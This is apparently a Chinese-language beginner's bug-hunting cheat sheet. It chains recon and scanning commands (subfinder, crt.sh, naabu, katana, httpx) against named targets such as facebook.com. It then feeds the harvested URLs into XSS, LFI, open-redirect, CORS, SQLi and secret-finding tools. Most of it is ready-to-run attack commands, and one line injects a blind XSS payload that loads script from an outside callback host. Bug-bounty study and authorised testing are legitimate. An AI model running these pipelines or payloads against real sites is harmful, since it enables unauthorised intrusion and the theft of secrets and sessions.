<center>Bug Hunting</center>





[toc]









## Bug Hunting

> 初学者渗透。









### 1. 子域名收集

```shell
mkdir test
cd test

# 子域名1
subfinder -d facebook.com -all -recursive > subdomain1.txt

# crt.sh
sudo apt  install jq -y
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subdomain2.txt

# 合并
cat subdomain1.txt subdomain2.txt  | sort | uniq > subdomains.txt

```

> 子域名： [subfinder](https://github.com/projectdiscovery/subfinder) 
>
> 子域名： [crt.sh](https://github.com/crtsh)





### 2. 端口扫描

```shell
# 安装 为缺少 libpcap 开发库
sudo apt-get install libpcap-dev -y
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest

# 使用
naabu -host hackerone.com

# 常用
naabu -list subdomains.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt

# 存活主机 httpx-tookit
sudo apt install httpx-toolkit
cat subdomains.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
```

> naabu: 用 Go 编写的快速端口扫描程序，注重可靠性和简单性。[github](https://github.com/projectdiscovery/naabu)
>
> httpx: `httpx`是一款快速且用途广泛的 HTTP 工具包，允许使用[retryablehttp](https://github.com/projectdiscovery/retryablehttp-go)库运行多个探测。它旨在通过增加线程数量来保持结果的可靠性。   [github](https://github.com/projectdiscovery/httpx)

```shell
# 自动化工具： 用于查找 SQLi、XSS、LFi、OpenRedirect 的自动侦察工具  https://github.com/aungsanoo-usa/aungrecon

git clone https://github.com/aungsanoo-usa/aungrecon.git
cd aungrecon

chmod +x install.sh
chmod +x aungrecon.sh

./install.sh
./aungrecon.sh
```

> katana: 下一代爬行和蜘蛛框架  [github](https://github.com/projectdiscovery/katana)

```shell
go install github.com/projectdiscovery/katana/cmd/katana@latest

# 爬去文件
katana -u subdomains_alive.txt -d 5 -kf -jc -fx -ef woff,pdf,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

# 查找配置文件
cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"

cat allurls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sed 's/=.*/=/' | sort | uniq > bsqli.txt
```





### 3. xss 漏洞

> kxss:  [github](https://github.com/Emoe/kxss)
>
> gxss: [github](https://github.com/KathanP19/Gxss)

```shell
cat allurls.txt | Gxss | kxss | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > xss.txt
```





### 4. lfi & open_redirect

> lfi 漏洞和open_redirect漏洞
>
> gf: grep 的包装器，帮助你 grep 东西 [github](https://github.com/tomnomnom/gf)

```shell
go install github.com/tomnomnom/gf@latest

cat allurls.txt | gf or | sed 's/=.*/=/' | sort -u > open_redirect.txt

cat allurls.txt | gf lfi | sed 's/=.*/=/' | sort -u > lfi_output.txt

```

> 总结，找到一些可能存在漏洞的地方了。开始攻击了









### 5. 攻击

> loxs: 查找 SQLi、CRLF、XSS、LFi、OpenRedirect 的最佳工具  [github](https://github.com/coffinxp/loxs)
>
> 安装： [文章](/网络安全/渗透工具/24Loxs快速查找漏洞.md)

```shell
python3 loxs.py 

# 选择urls和攻击的payload
│1] LFi Scanner                                               │
│2] OR Scanner                                                │
│3] SQLi Scanner                                              │
│4] XSS Scanner                                               │
│5] CRLF Scanner  
```

> xss_scanner: [github.com](https://github.com/aungsanoo-usa/xss_scanner)  。xss扫描
>
> 安装看redeme.

```shell
在xss_scanner中：
# 查看存在xss
python3 xss_scanner.py -l /home/goer/hackerone/facebook/bsqli.txt -p xss.txt -o output.txt
```

> 查找敏感信息
>
> SecretFinder:  一个用于查找敏感数据  [github](https://github.com/m4ll0k/SecretFinder)

````shell
# js文件
cat allurls.txt | grep -E "\.js$" >> js.txt


# 敏感信息
git clone https://github.com/m4ll0k/SecretFinder.git secretfinder
cd secretfinder
python -m pip install -r requirements.txt or pip install -r requirements.txt
python3 SecretFinder.py


# 使用
python3 SecretFinder.py -i js.txt -o secret.txt
````

> 目录扫描

```shell
sudo apt install dirsearch

dirsearch  -u https://www.example.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
```

> xss漏洞

```shell
# 工具 qurl & bxss
go install github.com/repejota/qurl/cmd/qurl@develop
go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest

# subfinder
subfinder -d example.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/aunglat></script>' -parameters
```

> 子域名检测： subzy [github](https://github.com/PentestPad/subzy)

```shell
subzy run --targets subdomains.txt --verify_ssl
```

> CORS 错误配置扫描程序: [github](https://github.com/s0md3v/Corsy)

```shell
git clone https://github.com/s0md3v/Corsy.git

python3 corsy.py -i /home/goer/hackerone/facebook/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
```

> nuclei: Nuclei 是一款现代的高性能漏洞扫描程序，它利用基于 YAML 的简单模板。 [github](https://github.com/projectdiscovery/nuclei)
>
> nuclei-templates: 社区精心挑选的用于核心引擎的模板列表，用于查找应用程序中的安全漏洞。[github](https://github.com/projectdiscovery/nuclei-templates)
>
> priv8-Nuclei: 作者的一些模板。 [github](https://github.com/aungsanoo-usa/priv8-Nuclei)

```shell
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# 下载作者的模块到  nuclei模块中 ~/.local
git clone https://github.com/aungsanoo-usa/priv8-Nuclei.git ~/.local/nuclei-templates/priv8-nclei

nuclei -list subdomains_alive.txt -t priv8-nclei/cors.yaml -v
```

> OpenRedireX 用于检测开放重定向漏洞的模糊测试器 [github](https://github.com/devanshbatham/OpenRedireX)

```shell
git clone https://github.com/devanshbatham/openredirex
cd openredirex
sudo chmod +x setup.sh
./setup.sh

# 全局安装依赖
pip3 install aiohttp tqdm

# python脚本安装到环境变量
cat setup.sh 
#!/bin/bash

# Rename the openredirex.py file to openredirex
mv openredirex.py openredirex


# Move the openredirex file to /usr/local/bin
sudo mv openredirex /usr/local/bin/

# Make the openredirex file executable
sudo chmod +x /usr/local/bin/openredirex

# Remove the openredirex.pyc file if it exists
if [ -f openredirex.pyc ]; then
    rm openredirex.pyc
fi

echo "openredirex has been installed successfully!"
```

```shell
# 使用
cat allurls.txt | gf redirect | openredirex -p ~/Tools/openredirex/payloads.txt
```

> shortscan: IIS 短文件名枚举工具 [github](https://github.com/bitquark/shortscan)

```shell
go install github.com/bitquark/shortscan/cmd/shortscan@latest

# 使用
shortscan https://example.com/ -F
```

